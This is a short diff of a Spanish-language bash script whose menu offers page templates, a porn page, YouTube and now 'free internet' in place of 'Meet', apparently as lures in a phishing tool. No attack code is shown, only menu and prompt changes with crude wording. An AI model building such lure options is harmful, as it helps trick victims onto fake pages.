@@ -14,7 +14,6 @@ blue="\33[1;34m"
 echo ""
 echo -e "$red"
 echo "ERES INVICIBLE "
-echo ""
 sleep 1
 clear
 
@@ -170,9 +169,9 @@ else
 printf "\n-POR DEFECTO 1-\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m PAGINA PORNO ROJO \e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YOU TUBE\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m MEET \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m INTERNET GRATIS \e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] OPCION [1 O 2] \e[0m' option_tem
+read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] OPCION [1 O 2 O 3] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] COLOCA TU PUTO NOMBRE: \e[0m' fest_name
